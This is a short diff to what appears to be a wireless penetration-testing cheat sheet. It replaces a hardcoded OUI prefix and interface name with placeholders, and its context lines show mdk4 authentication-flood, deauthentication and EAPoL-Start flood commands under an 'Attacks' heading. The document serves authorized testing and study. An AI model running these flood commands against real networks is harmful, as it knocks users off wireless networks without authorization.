@@ -66,7 +66,7 @@ Key information to check:
 ## Vendor Lookup
 
 ```bash
-grep -i "84-1B-5E" /var/lib/ieee-data/oui.txt
+grep -i "AA-BB-CC" /var/lib/ieee-data/oui.txt
 ```
 
 ## Attacks
@@ -125,7 +125,7 @@ mdk4 $interface a -a $bssid
 mdk4 $interface d -c $channel
 
 # EAPoL-Start flood
-mdk4 wlan0mon e -t $bssid
+mdk4 $interface e -t $bssid
 ```
 
 ## Pre-Defined PINs (Default Algorithms)
